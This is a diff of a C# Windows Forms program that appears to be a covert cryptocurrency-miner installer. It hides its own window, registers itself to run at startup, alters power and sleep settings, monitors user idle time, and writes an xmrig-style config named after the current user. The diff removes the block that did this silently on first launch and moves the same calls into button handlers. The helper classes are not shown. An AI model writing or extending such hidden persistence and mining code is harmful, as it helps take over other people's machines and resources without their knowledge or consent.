@@ -89,30 +89,6 @@ namespace WindowsFormsApp1
                 hiden = true;
                 Hide();
 
-                if (!File.Exists(Environment.CurrentDirectory + @"\json.txt"))
-                {
-                    string name = Environment.UserName;
-                    Translite trans = new Translite();
-                    trans.Tr2(name);
-
-                    CreateConfig cc = new CreateConfig();
-                    cc.stringeditor2(Environment.CurrentDirectory + @"\config.json", "11111111111111111", name);
-                    File.Create(Environment.CurrentDirectory + @"\json.txt");
-                }
-
-                if (!File.Exists(Environment.CurrentDirectory + @"\autorn.txt"))
-                {
-                    Autorun autoR = new Autorun();
-                    autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName);
-                    File.Create(Environment.CurrentDirectory + @"\autorn.txt");
-                }
-
-                if (!File.Exists(Environment.CurrentDirectory + @"\power.txt"))
-                {
-                    PowerSetings pow = new PowerSetings();
-                    pow.SetSetings();
-                    File.Create(Environment.CurrentDirectory + @"\power.txt");
-                }
             }
             else if (hiden == false && !File.Exists(progStartName + @"\redy.txt"))
             {
@@ -359,12 +335,6 @@ namespace WindowsFormsApp1
                 label1.Text = "USB  disconnected!";
         }
 
-        private void button5_Click(object sender, EventArgs e)
-        {
-            label3.Text = DateTime.Now.ToString("yyyy.MM.dd, HH.mm.ss");    //можно разделять как хочешь. Можно оставить только дату или только время
-            label3.Text = progStartName;
-        }
-
         private void button6_Click(object sender, EventArgs e)
         {
             lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo); //присвоение переменной времени бездействия
@@ -386,9 +356,13 @@ namespace WindowsFormsApp1
 
         private void button9_Click(object sender, EventArgs e)      //создание конфига
         {
-            //oWerlord для ноутбука, oVerlord для компа
+            string name = Environment.UserName;
+            Translite trans = new Translite();
+            trans.Tr2(name);
+
             CreateConfig cc = new CreateConfig();
-            cc.stringeditor2(@"C:\Users\Owerlord\Desktop\xmrig\config.json", "rigNameeeeeeeeeee", "1111");
+            cc.stringeditor2(Environment.CurrentDirectory + @"\config.json", "11111111111111111", name);
+            File.Create(Environment.CurrentDirectory + @"\json.txt");
         }
 
         private void button10_Click(object sender, EventArgs e)     //установки настроек Спящих режимов
@@ -401,6 +375,19 @@ namespace WindowsFormsApp1
         {
             FolderCreate create = new FolderCreate();
             create.PathCreate(@"C:\Users\Owerlord\Desktop\112211");
+        }
+
+        private void button8_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+
+            Autorun autoR = new Autorun();
+            autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName);
+            //File.Create(Environment.CurrentDirectory + @"\autorn.txt");
         }
     }
 }
